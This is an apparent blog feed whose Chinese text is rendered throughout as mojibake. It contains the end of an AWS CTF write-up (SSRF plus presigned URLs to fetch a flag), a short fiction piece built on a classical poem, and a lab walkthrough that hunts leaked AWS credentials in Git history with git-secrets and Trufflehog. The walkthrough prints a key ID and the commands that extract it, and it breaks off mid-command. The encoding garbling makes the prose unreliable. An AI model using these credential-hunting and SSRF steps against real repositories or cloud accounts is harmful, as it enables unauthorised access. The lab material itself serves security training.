é™åˆ¶ï¼Œè®¿é—®è¢«æ‹’ç»</td></tr><tr><td>æ•°æ®å¤–æ³„</td><td>ç»•è¿‡æ•°æ®è¾¹ç•Œé™åˆ¶</td><td>ä½¿ç”¨é¢„ç­¾å URL</td><td>åˆ©ç”¨ IAM å‡­è¯ç”Ÿæˆ`presigned URL`ï¼Œå¹¶é€šè¿‡ SSRF`&#x2F;proxy` è®¿é—®ç›®æ ‡å¯¹è±¡</td></tr><tr><td>æŠ€æœ¯ç»†èŠ‚</td><td>SSRF + URL ç¼–ç ç»•è¿‡</td><td>ä¿®å¤ URL ç¼–ç é—®é¢˜</td><td>å¯¹`presigned URL`ä½¿ç”¨`jq -sRr @uri` è¿›è¡Œç¼–ç ï¼Œæœ€ç»ˆæˆåŠŸè®¿é—®å¹¶è·å– flag</td></tr></tbody></table><p>æˆ‘ä»¬å¯¹è¿™é“é¢˜ç›®è¿›è¡Œäº†è¯¦ç»†è¯´æ˜ä¸æ‹†è§£ï¼Œéå¸¸é€‚åˆæ–°æ‰‹æŒ‰æ­¥éª¤æ“ä½œã€‚åŒæ—¶ï¼Œä¹Ÿæœ‰å¤§ä½¬æŒ‡å‡ºå¯ä»¥è¿›ä¸€æ­¥æ‹“å±•å­¦ä¹ ï¼š</p><ul><li>OSSï¼ˆObject Storage Serviceï¼‰æœ‰å‡ ç§ Bucket Policyï¼Ÿä¾‹å¦‚ï¼Œæœ¬é¢˜æ¶‰åŠçš„åŸºäºèº«ä»½çš„è®¿é—®æ§åˆ¶ï¼ˆå¦‚ IAM ç”¨æˆ·&#x2F;è§’è‰²è®¿é—®ï¼‰ä»¥åŠåŸºäºè¯·æ±‚æ¥æºçš„æ¡ä»¶é™åˆ¶ï¼ˆå¦‚ <code>aws:Referer</code>ï¼‰ã€‚</li><li>OSS çš„ç­¾åæ–¹å¼æœ‰å“ªäº›ï¼Ÿä¾‹å¦‚ï¼Œæœ¬é¢˜è€ƒå¯Ÿçš„åŸºäº Access Key å’Œ Secret çš„ç­¾åæœºåˆ¶ï¼Œä»¥åŠ URL ç­¾åï¼ˆPresigned URLï¼‰ï¼šä¸´æ—¶ç”Ÿæˆç”¨äºè®¿é—®ç§æœ‰å¯¹è±¡çš„é“¾æ¥ã€‚</li></ul><p>å¦åˆ™ï¼Œä»…ä»…äº†è§£è§£é¢˜æ€è·¯ï¼Œå´ä¸çŸ¥é“å¦‚ä½•è¿›è¡Œæ€è€ƒå’Œæ€»ç»“ï¼Œå­¦ä¹ æ•ˆæœä¼šå¤§æ‰“æŠ˜æ‰£ã€‚è‹¥ä½ è§‰å¾—æœ¬ç¯‡æ–‡ç« è¿˜æœ‰ä¸€äº›ä¸å¥½ç†è§£çš„åœ°æ–¹ï¼Œæ¬¢è¿è¿›å…¥æˆ‘ä»¬çš„è¯»è€…äº¤æµç¾¤ï¼Œæˆ‘ä»¬ä¸€èµ·æ¢è®¨ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS å®‰å…¨</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœ‰ç‹ï¼ˆæ¥”å­ï¼‰</title>
    <link href="/2025/05/20/%E6%9C%89%E7%8B%90%EF%BC%88%E6%A5%94%E5%AD%90%EF%BC%89/"/>
    <url>/2025/05/20/%E6%9C%89%E7%8B%90%EF%BC%88%E6%A5%94%E5%AD%90%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ‰ç‹ç»¥ç»¥ï¼Œåœ¨å½¼æ·‡æ¢ã€‚å¿ƒä¹‹å¿§çŸ£ï¼Œä¹‹å­æ— è£³ã€‚</p><p>æœ‰ç‹ç»¥ç»¥ï¼Œåœ¨å½¼æ·‡å‰ã€‚å¿ƒä¹‹å¿§çŸ£ï¼Œä¹‹å­æ— å¸¦ã€‚</p><p>æœ‰ç‹ç»¥ç»¥ï¼Œåœ¨å½¼æ·‡ä¾§ã€‚å¿ƒä¹‹å¿§çŸ£ï¼Œä¹‹å­æ— æœã€‚</p><p>â€”â€”ã€Šå›½é£Â·å«é£Â·æœ‰ç‹ã€‹</p></blockquote><p>æœ‰åªå°ç‹ç‹¸åœ¨é‚£æ…¢æ…¢èµ°ï¼Œå°±åœ¨æ·‡æ°´çŸ³æ¡¥ä¸Šã€‚å¥¹çš„å¿ƒé‡ŒçœŸå¿§æ„ï¼Œå¥¹æ‹…å¿ƒä»–èº«ä¸Šæ²¡è¡£è£³ã€‚</p><p>æœ‰åªå°ç‹ç‹¸åœ¨é‚£æ…¢æ…¢èµ°ï¼Œå°±åœ¨æ·‡æ°´æµ…æ»©ä¸Šã€‚å¥¹çš„å¿ƒé‡ŒçœŸå¿§æ„ï¼Œå¥¹æ‹…å¿ƒä»–æ²¡è…°å¸¦ä¸åƒæ ·ã€‚</p><p>æœ‰åªå°ç‹ç‹¸åœ¨é‚£æ…¢æ…¢èµ°ï¼Œå°±åœ¨æ·‡æ°´æ²³å²¸æ—ã€‚å¥¹çš„å¿ƒé‡ŒçœŸå¿§æ„ï¼Œå¥¹æ‹…å¿ƒä»–æ²¡è¡£æœå¥¹å¿ƒä¼¤ã€‚</p><p>æ­¥å±¥è¹’è·šäºæ¼«æ¼«é»„æ²™ä¹‹ä¸­ï¼Œæœ›å¤©è¾¹ï¼Œä¸€æŠ¹æ™šéœé©»ç•™åœ¨å¤©é™…ä¹…ä¹…æœªè½ã€‚è½»è½»æ§èµ·ä¸€ç¼•æµæ²™ï¼Œæˆ‘æƒ³èµ·äº†å¹´å°‘æ—¶å¬‰æˆäºé’æ¥¼æ¥šé¦†ï¼Œé†‰å€’åœ¨é»„å…¬é…’å†çš„æ—¥å­ï¼›å¿†èµ·äº†è¿½éšçˆ¶äº²å—å¾åŒ—ç«™ï¼Œé‡‘æˆˆé“é©¬çš„æ—¶å…‰ã€‚æˆ‘æ‚²æ¸åœ°é˜–ä¸Šçœ¼ï¼ŒèŒ•èŒ•å­‘ç«‹äºè’æ¼ ä¸­ï¼Œå¦‚ä»Šæˆ‘ä¹Ÿè¦ç¦»å¼€äº†ã€‚</p><p>ä¸‰å¹´è¿‡å»äº†ï¼Œåœ¨è¿‡å»çš„ä¸€åƒå¤šä¸ªæ—¥æ—¥å¤œå¤œï¼Œæˆ‘å¸¸å¸¸æƒ³æ˜¯ä¸æ˜¯å¹´å°‘è¿‡å¾—å¤ªæ¬¢ä¹äº†ï¼Œå°†ä½™ç”Ÿçš„å¹¸ç¦éƒ½ç”¨å®Œäº†ï¼Œå¯¼è‡´æˆ‘åœ¨åæ¥ä¸€æ¬¡åˆä¸€æ¬¡çš„é»‘å¤œä¸­éœ€è¦åå¤çš„å“å°å§å§å’Œçˆ¶äº²æ­»å»çš„ç—›è‹¦ï¼Œæ¯å½“åˆå¤œæ¢¦é†’ï¼Œä¸¤è¡Œæ¸…æ³ªè½ä¸‹ï¼Œæ•è¾¹äººå°†æˆ‘æŠ±åœ¨æ€€é‡Œï¼šâ€œå°ç‹ç‹¸ï¼Œåˆ«æ€•ï¼Œæœ‰æˆ‘åœ¨ï¼Œæˆ‘ä¼šæŠ¤ä½ ä¸€ç”Ÿå®‰å®çš„ã€‚â€</p><p>æ‰‹é‡Œç´§ç´§æ¡ç€ä¸€æšé¢å…·ã€é‚£æ˜¯ä»–åœ¨æˆ‘ç¬¬ä¸€æ¬¡ä¸Šæˆ˜åœºæ—¶ï¼Œäº²æ‰‹ä¸ºæˆ‘æ‰“é€ ã€‚å½“æ—¶ä»–é—®æˆ‘ä¸ºä»€ä¹ˆè¦è·‘åˆ°æˆ˜åœºæ¥ã€‚</p><p>æˆ‘å‘Šè¯‰ä»–ï¼Œæˆ‘æ‹…å¿ƒçˆ¶äº²ã€äºŒå“¥ã€å››å“¥è¿˜æœ‰â€¦ â€¦ï¼Œè¯æœªè¯´å®Œä»–å¿½ç„¶â€œæ‰‘å“§â€ä¸€å£°ç¬‘äº†ï¼Œä¸€åªæ‰‹æŒ‰åœ¨æˆ‘å¤´ä¸Šï¼Œåƒæ˜¯å¯¹ä¸€ä¸ªä¸å¬è¯çš„å°å¦¹å¦¹ï¼Œææœ‰è€å¿ƒåœ°è¯´æ•™ï¼šâ€œæˆ‘ä»¬éƒ½æ˜¯ä¹…ç»æˆ˜åœºçš„äººï¼Œæœ‰ä»€ä¹ˆå¥½æ‹…å¿ƒçš„ã€‚æˆ˜åœºéå„¿æˆï¼Œå²‚æ˜¯ä½ ä¸€ä»‹å°å°çš„å¥³å­å®æ··çš„åœ°æ–¹ï¼Œè¿˜æ˜¯å›å°†å†›åºœå»å§ã€‚â€</p><p>æˆ‘ä¸æœæ°”ï¼Œåé©³é“ï¼šâ€œçˆ¶äº²è¯´è¿‡ï¼Œæ–›å¾‹å®¶çš„å„¿éƒå„ä¸ªéƒ½æ˜¯å†²é”‹é™·é˜µçš„ç”·å­æ±‰ã€ä¸ºå›½æ•ˆå¿ çš„å¥½ç”·å„¿ã€‚æˆ‘æ‰ä¸å®³æ€•ï¼â€</p><p>â€œæ˜¯æ˜¯æ˜¯ï¼å¯ä½ ä»Šå¹´æ‰åäºŒå²ï¼Œè¿˜æ˜¯åªå°ç‹ç‹¸ã€‚â€</p><p>â€œä¸è®¸å«æˆ‘ç‹ç‹¸ï¼ï¼ï¼â€æˆ‘æ€’æ°”æœå¤©ï¼Œè€Œä»–åªæ˜¯æ¶æ„ä¸€ç¬‘ï¼Œå°†åªé¢å…·ç½©åœ¨æˆ‘è„¸ä¸Šã€‚æˆ‘æ„£äº†ä¸€ä¼šå„¿æ­ä¸‹é¢å…·ã€‚</p><p><strong>â€œç‹ç‹¸å§‘å¨˜ï¼Œä½ çœ‹è¿™ä¸ªé¢å…·æ˜¯ä¸æ˜¯ç‰¹åˆ«é€‚åˆä½ ï¼Ÿâ€</strong></p><p>è¿‡å»çš„ä»¿ä½›æ˜¯ä¸€ä¸ªå¾ˆé•¿å¾ˆé•¿çš„æ¢¦ï¼Œååå¤å¤ï¼Œçº ç»“ç¼ ç»•ï¼Œå¯æ˜¯ä»å¤´åˆ°å°¾ï¼Œéƒ½åªæœ‰ä¸€å¼ é¢å­”ï¼Œä»–æ—¶è€Œæ¸…æ¥šï¼Œæ—¶è€Œæ¨¡ç³Šï¼Œæœ‰è¿‡ç¬‘å®¹æ˜äº®çš„æ—¶å€™ï¼Œä¹Ÿæ›¾ç»å†°å†·æ·¡æ¼ ç›®å…‰çŠ€åˆ©â€¦ â€¦é‚£äº›ï¼Œå…¨éƒ¨éƒ½æ˜¯ä»–ï¼Œä¹Ÿåªæœ‰ä»–ã€‚</p><p>ä¸€é˜µé£å¹æ¥ï¼Œå·èµ·æ¼«æ¼«é»„æ²™ï¼Œä¹Ÿæ’©èµ·æˆ‘çš„å‘ä¸ï¼Œæš®è‰²é™ä¸´ï¼Œå¤©è¾¹çš„æ–œé˜³å¦‚åŒé²œè¡€ä¸€èˆ¬çš„çŒ©çº¢ã€‚å¤§æ¼ å£®ä¸½çš„é£æ™¯æ¸æ¸æ¨¡ç³Šï¼Œæˆ‘æ— åŠ›åœ°å€’åœ¨è’æ¼ ä¸­å¤®ï¼Œæˆ‘å‘½æœ¬åº”ç»“æŸäºç­é—¨çš„é‚£æ¬¡ç¾ç¥¸ä¸­ï¼Œæ— å¥ˆæ´»äº†è¿™å‡ äº›å¹´ï¼Œåè€Œæ‹–ç´¯äº†æ— è¾œçš„äººã€‚ä¸Šç©·ç¢§è½ä¸‹é»„æ³‰ï¼Œå­ç“˜ä½ æ˜¯å¦è¿˜ä¼šæ¥æ¥æˆ‘ã€‚</p><p>â€œå°ç‹ç‹¸â€¦ â€¦â€è€³ç•”ä¼ æ¥ä»–çš„ç»µç»µç»†è¯­ï¼Œæˆ‘çœ‹åˆ°äº†ä»–å‘æˆ‘ä¼¸å‡ºæ‰‹ï¼Œé‚£å¼ æˆ‘æ—¥å¤œæ€å¿µçš„å®¹é¢œå†æ¬¡é‡ç°ï¼Œæˆ‘æƒ³å‘Šè¯‰ä»–ï¼Œåœ¨ä»–èµ°çš„é‚£äº›æ—¥å­ï¼Œæˆ‘å¾ˆåšå¼ºï¼Œæˆ‘æ²¡æœ‰æ‰çœ¼æ³ªï¼Œæˆ–æ‚²æ‚¯ï¼Œæˆ–å˜²è®½ï¼Œæˆ–ä¸–æ€ç‚å‡‰ï¼Œæˆ–äººæƒ…å†·æš–ï¼Œæˆ‘ç‹¬è‡ªé¢å¯¹ç€ã€‚</p><p>æˆ‘è¿˜æƒ³å‘Šè¯‰ä»–ï¼Œè‡ªä»å“¥å“¥ä»¬ï¼Œå§å§å’Œçˆ¶äº²æ­»åï¼Œç»å†äº†é‚£ä¹ˆå¤šäº‹æƒ…ã€å˜æ•…ï¼Œä»–ä¸ä»…æ˜¯æˆ‘æœ€çˆ±çš„äººï¼Œè¿˜æ˜¯æˆ‘å”¯ä¸€çš„äº²äººï¼Œæˆ‘å¾®ç¬‘ç€ç¼“ç¼“å°†æ‰‹ä¼¸è¿‡å»â€¦ â€¦</p><p>ä¸€é¦–æ­Œè°£ä¼¼ä»è¿œæ–¹ä¼ æ¥ï¼šâ€œæ••å‹’å·ï¼Œé˜´å±±ä¸‹ã€‚å¤©ä¼¼ç©¹åºï¼Œç¬¼ç›–å››é‡ã€‚å¤©è‹è‹ï¼Œé‡èŒ«èŒ«ã€‚é£å¹è‰ä½è§ç‰›ç¾Šâ€¦ â€¦</p><blockquote><p>ã€Šä¹åºœå¹¿é¢˜ã€‹äº‘ï¼šâ€œåŒ—é½ç¥æ­¦æ”»å‘¨ç‰å£ï¼Œå£«å’æ­»è€…åå››äº”ï¼Œç¥æ­¦æšæ„¤ï¼Œç–¾å‘ã€‚å‘¨ç‹ä¸‹ä»¤æ›°ï¼šâ€˜é«˜æ¬¢é¼ å­ï¼Œäº²çŠ¯ç‰å£ï¼Œå‰‘å¼©ä¸€å‘ï¼Œå…ƒå‡¶è‡ªæ¯™ã€‚â€™ç¥æ­¦é—»ä¹‹ï¼Œå‹‰åä»¥å®‰å£«ä¼—ã€‚æ‚‰å¼•è¯¸è´µï¼Œä½¿æ–›å¾‹é‡‘å”±ã€Šæ••å‹’ã€‹ï¼Œç¥æ­¦è‡ªå’Œä¹‹ã€‚â€</p><p>ä¸œé­æ­¦å®šå››å¹´ï¼ˆ546ï¼‰ï¼Œä¸œé­æƒè‡£é«˜æ¬¢ç‡å…µåä¸‡ä»æ™‹é˜³å—å‘è¿›æ”»è¥¿é­çš„å†›äº‹é‡é•‡ç‰å£ï¼ˆä»Šå±±è¥¿å—éƒ¨ç¨·å±±å¿è¥¿å—ï¼‰ï¼ŒæŠ˜å…µä¸ƒä¸‡ï¼Œè¿”å›æ™‹é˜³é€”ä¸­ï¼Œå†›ä¸­è°£ä¼ å…¶ä¸­ç®­å°†äº¡ï¼Œé«˜æ¬¢å¸¦ç—…å¼ºè‡ªè®¾å®´é¢ä¼šå¤§è‡£ã€‚ä¸ºæŒ¯å†›å¿ƒï¼Œä»–å‘½éƒ¨å°†æ–›å¾‹é‡‘å”±ã€Šæ••å‹’æ­Œã€‹ï¼Œé‚ä½¿å°†å£«æ€€æ—§ï¼Œå†›å¿ƒå¤§æŒ¯ã€‚</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>æœ‰ç‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hunt for Secrets in Git Reposï¼šå¯»æ‰¾ Git Repos ä¸­çš„ç§˜å¯†</title>
    <link href="/2025/05/03/%E3%80%90Pwned-Labs%E3%80%91Hunt-for-Secrets-in-Git-Repos%EF%BC%9A%E5%AF%BB%E6%89%BE-Git-Repos-%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <url>/2025/05/03/%E3%80%90Pwned-Labs%E3%80%91Hunt-for-Secrets-in-Git-Repos%EF%BC%9A%E5%AF%BB%E6%89%BE-Git-Repos-%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-åœºæ™¯ä»‹ç»"><a href="#0x00-åœºæ™¯ä»‹ç»" class="headerlink" title="0x00 åœºæ™¯ä»‹ç»"></a>0x00 åœºæ™¯ä»‹ç»</h2><p>åœ¨ä¸ºå®¢æˆ·è¯„ä¼°å¨èƒå½¢åŠ¿çš„è¿‡ç¨‹ä¸­ï¼Œä½ æ­£åœ¨å¯¹ä¸€ä¸ªä¸å¤ªçŸ¥åçš„æš—ç½‘è®ºå›è¿›è¡Œ OSINTï¼ˆå¼€æºæƒ…æŠ¥ï¼‰è°ƒæŸ¥ã€‚</p><p>ä½ åœ¨ä¸€ä¸ªè®¨è®ºé«˜ä»·å€¼ç›®æ ‡çš„å¸–å­ä¸­å‘ç°äº†çº¿ç´¢ã€‚</p><p>åœ¨ä¸€å †æ··ä¹±çš„é“¾æ¥å’Œç‚«è€€è¨€è®ºä¸­ï¼Œæœ‰ä¸ªç”¨æˆ·éšå£æåˆ°å‘ç°äº†ä¸€ä¸ªå±äºä½ å®¢æˆ·â€”â€”å›½é™…ç‰©æµå·¨å¤´ Huge Logistics çš„ GitHub ä»“åº“ã€‚</p><p>ä¸€äº›åœ°ä¸‹ç ”ç©¶è€…æš—ç¤ºä»–ä»¬å‘ç°äº†æŸäº›ä¸œè¥¿ï¼Œä½†è¯´å¾—å¾ˆå«ç³Šã€‚ä½ çš„ç›´è§‰å‘Šè¯‰ä½ ï¼Œè¿™é‡Œé¢è‚¯å®šè¿˜æœ‰æ›´å¤šä¿¡æ¯ç­‰å¾…æ­ç¤ºã€‚</p><p>ä½ çš„ç›®æ ‡ï¼Ÿæ·±å…¥åˆ†æè¿™ä¸ªä»“åº“ï¼Œè¿½è¸ªä»»ä½•ç›¸å…³çš„åŸºç¡€è®¾æ–½ï¼Œå‘ç°æ½œåœ¨æ¼æ´â€”â€”è¦æŠ¢åœ¨å®ƒæˆä¸ºæ˜å¤©æ–°é—»å¤´æ¡ä¹‹å‰ã€‚</p><p>æ—¶é—´ç´§è¿«ï¼Œä½ èƒ½å¦å…ˆæ•Œä¸€æ­¥ï¼Œå‡»è´¥å¯¹æ‰‹ï¼Ÿ</p><blockquote><p><strong>ğŸ¯ ç‚¹å‡»ã€é˜…è¯»åŸæ–‡ã€‘ï¼Œç«‹å³è¿›å…¥é¶åœºç¯å¢ƒï¼</strong></p></blockquote><h2 id="0x01-å‰ç½®çŸ¥è¯†"><a href="#0x01-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†"></a>0x01 å‰ç½®çŸ¥è¯†</h2><ul><li>åŸºæœ¬çš„ Linux å‘½ä»¤è¡ŒçŸ¥è¯†</li></ul><h2 id="0x02-å­¦ä¹ ç›®æ ‡"><a href="#0x02-å­¦ä¹ ç›®æ ‡" class="headerlink" title="0x02 å­¦ä¹ ç›®æ ‡"></a>0x02 å­¦ä¹ ç›®æ ‡</h2><ul><li>ä½¿ç”¨ git-secrets å’Œ Trufflehog è¿›è¡Œæ•æ„Ÿä¿¡æ¯æœå¯»</li><li>ç†è§£å¦‚ä½•é¢„é˜²å‡­è¯æ³„éœ²åŠå¦‚ä½•å“åº”ç›¸å…³äº‹ä»¶</li></ul><h2 id="0x03-éš¾åº¦ç­‰çº§"><a href="#0x03-éš¾åº¦ç­‰çº§" class="headerlink" title="0x03 éš¾åº¦ç­‰çº§"></a>0x03 éš¾åº¦ç­‰çº§</h2><ul><li>åˆå­¦è€…ï¼ˆBeginnerï¼‰</li></ul><h2 id="0x04-å…³æ³¨é‡ç‚¹"><a href="#0x04-å…³æ³¨é‡ç‚¹" class="headerlink" title="0x04 å…³æ³¨é‡ç‚¹"></a>0x04 å…³æ³¨é‡ç‚¹</h2><ul><li>çº¢é˜Ÿï¼ˆRedï¼‰</li></ul><h2 id="0x05-çœŸå®èƒŒæ™¯"><a href="#0x05-çœŸå®èƒŒæ™¯" class="headerlink" title="0x05 çœŸå®èƒŒæ™¯"></a>0x05 çœŸå®èƒŒæ™¯</h2><p>Git ä»“åº“ä¸­æ³„éœ²å‡­è¯æ˜¯ä¸€ä¸ªéå¸¸æ™®éä¸”çœŸå®å­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚</p><p>å‡­è¯è¢«å…¬å¼€å¯èƒ½å¯¼è‡´å•ä¸ªç³»ç»Ÿç”šè‡³æ•´ä¸ªå…¬å¸ç½‘ç»œå’Œå¹³å°è¢«æ”»ç ´ã€‚</p><p>é™¤äº†å£°èª‰å—æŸå¤–ï¼Œè¿˜å¯èƒ½å¸¦æ¥å·¨é¢çš„äº‘èµ„æºè´¦å•ï¼›æ›´ä¸¥é‡çš„æ˜¯ï¼Œå¦‚æœå®¢æˆ·æ•°æ®å› æ­¤æ³„éœ²ï¼Œæ¥è‡ªç›‘ç®¡æœºæ„çš„ç½šæ¬¾å¯èƒ½ä¼šé«˜å¾—æƒŠäººã€‚</p><h2 id="0x06-è§£é¢˜æ€è·¯"><a href="#0x06-è§£é¢˜æ€è·¯" class="headerlink" title="0x06 è§£é¢˜æ€è·¯"></a>0x06 è§£é¢˜æ€è·¯</h2><h3 id="6-1-åˆæ­¥æ¢æŸ¥"><a href="#6-1-åˆæ­¥æ¢æŸ¥" class="headerlink" title="6.1 åˆæ­¥æ¢æŸ¥"></a>6.1 åˆæ­¥æ¢æŸ¥</h3><p>æˆ‘ä»¬å…ˆè®¿é—® Github ä»“åº“ï¼Œå®ƒçœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªç‰©æµç½‘ç«™ï¼Œæ€»å…±æœ‰ 6 ä¸ªæäº¤ã€‚</p><p><img src="/image/image_W2t7yM8NCj.png"></p><p>å°†å…¶å…‹éš†åˆ°æœ¬åœ°ï¼Œè¿›è¡Œè¿›ä¸€æ­¥æ£€æŸ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/huge-logistics/cargo-logistics-dev<br></code></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ <code>index.html</code>ï¼Œæ˜¾ç¤ºå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/image/image_y_QLECaMFw.png"></p><h3 id="6-2-git-secrets"><a href="#6-2-git-secrets" class="headerlink" title="6.2 git-secrets"></a>6.2 git-secrets</h3><p><a href="https://github.com/awslabs/git-secrets" title="git-secrets">git-secrets</a>æ˜¯ç”±<strong>AWS å®éªŒå®¤å›¢é˜Ÿ</strong> å¼€å‘çš„ä¸€æ¬¾å·¥å…·ï¼Œæ—¨åœ¨é˜²æ­¢å°†å¯†ç ã€API å¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯æ„å¤–æäº¤åˆ° Git ä»“åº“ä¸­ã€‚</p><p>å®ƒçš„å·¥ä½œåŸç†æ˜¯ï¼šæ‰«æ Git ä»“åº“çš„å†…å®¹ï¼Œä½¿ç”¨<strong>é¢„å®šä¹‰çš„æ­£åˆ™è¡¨è¾¾å¼è§„åˆ™</strong>æ¥è¯†åˆ«å¸¸è§çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ AWS å¯†é’¥ã€ä»¤ç‰Œç­‰ï¼‰ã€‚å½“å…¶æ£€æµ‹åˆ°åŒ¹é…é¡¹æ—¶ï¼Œä¼šæ ¹æ®é…ç½®å‘å‡ºè­¦å‘Šæˆ–ç›´æ¥é˜»æ­¢æäº¤æˆ–æ¨é€ã€‚</p><p>å®‰è£…æ–¹å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/awslabs/git-secrets<br><span class="hljs-built_in">cd</span> git-secrets<br>make install<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_LOpb8w45Dz.png"></p><p>æˆ‘ä»¬è¿›å…¥ Git ä»“åº“ï¼Œgit-secrets ä¸ºè¯¥ä»“åº“å®‰è£… Git é’©å­ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åï¼Œè¯¥ä»“åº“ä¸­çš„æäº¤å’Œéå¿«è¿›åˆå¹¶æ“ä½œå°†è¢«é˜»æ­¢æäº¤åŒ…å«æ•æ„Ÿä¿¡æ¯çš„å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> cargo-logistics-dev/<br>git secrets --install<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>--register-aws</code> é€‰é¡¹ï¼Œå¯å°†å¸¸è§çš„ AWS æ¨¡å¼ï¼ˆå³æ­£åˆ™è¡¨è¾¾å¼è§„åˆ™ï¼‰æ·»åŠ åˆ° Git é…ç½®ä¸­ï¼Œä»¥ç¡®ä¿ä¸ä¼šåœ¨ä»»ä½•æäº¤ä¸­æ£€æµ‹åˆ° AWS å¯†é’¥å’Œ<code>~/.aws/credentials</code> æ–‡ä»¶ä¸­çš„å¯†é’¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git secrets --register-aws<br></code></pre></td></tr></table></figure><p><img src="/image/image_8yiGgZqOwd.png"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ Git ä»“åº“è¿›è¡Œæ‰«æäº†ï¼š</p><ol><li>é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>--scan</code> å¯¹ä»“åº“è¿›è¡Œå…¨ç›˜æ‰«æï¼Œä½†è¿™æ¬¡æ‰«æå¹¶æœªè¿”å›æ‰€åŒ¹é…åˆ°çš„æ•æ„Ÿä¿¡æ¯ã€‚</li><li>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>--scan-history</code> å¯¹ä»“åº“çš„æ‰€æœ‰å†å²æäº¤è¿›è¡Œæ‰«æã€‚è¿™æ¬¡ï¼Œæˆ‘ä»¬æ‰«æå‡ºåœ¨æäº¤è®°å½•<code>d8098af5fbf1aa35ae22e99b9493ffae5d97d58f</code>çš„<code>log-s3-test/log-upload.php</code> æ–‡ä»¶ä¸­å­˜åœ¨æ•æ„Ÿä¿¡æ¯<code>AKIAWHEOTHRFSGQITLIY</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git secrets --scan<br>git secrets --scan-history<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_sthaH8jXFm.png"></p><p>æˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹è¯¥æäº¤è®°å½•ä¸­çš„æ–‡ä»¶<code>log-upload.php</code>ï¼Œä¾¿å¯è·å–è·å– AWS çš„ç™»å½•å‡­è¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git show d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php<br></code></pre></td></tr></table></figure><p><img src="/image/image_4lpaFXY9sa.png"></p><h3 id="6-3-Trufflehog"><a href="#6-3-Trufflehog" class="headerlink" title="6.3 Trufflehog"></a>6.3 Trufflehog</h3><p><a href="https://github.com/trufflesecurity/trufflehog" title="Trufflehog">Trufflehog</a>æ˜¯å¦ä¸€ä¸ªç”¨äºè‡ªåŠ¨å‘ç° Git ä»“åº“ä¸­å‡­è¯ä¿¡æ¯çš„ä¼˜ç§€å·¥å…·ã€‚å®ƒæœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸‹é¢å°†åˆ†åˆ«å±•ç¤ºå®ƒä»¬çš„ä½¿ç”¨å‘½ä»¤ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒ…ç®¡ç†å™¨å¿«é€Ÿå®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install trufflehog     <span class="hljs-comment"># Mac</span><br>apt install trufflehog        <span class="hljs-comment"># Debian</span><br><br></code></pre></td></tr></table></figure><p>æˆ–è€…æ˜¯ä»æºç æ„å»º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/trufflesecurity/trufflehog/; <span class="hljs-built_in">cd</span> trufflehog<br>go build<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ä½¿ç”¨ trufflehog å¯¹è¿œç¨‹ä»£ç ä»“åº“è¿›è¡Œæ‰«æï¼Œåªéœ€è¦æä¾› URL å³å¯ï¼š</p><ul><li><code>--max-depth 2</code>ï¼šè®¾ç½®æ‰«ææ·±åº¦ä¸º 2ã€‚trufflehog é»˜è®¤ä¼šå¯¹å…¨éƒ¨çš„å†å²è®°å½•è¿›è¡Œæ‰«æï¼Œè¯¥é€‰é¡¹åªåˆ†æå‰ 2 æ¬¡æäº¤ï¼Œå¯åŠ å¿«æ‰«æé€Ÿåº¦ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trufflehog git 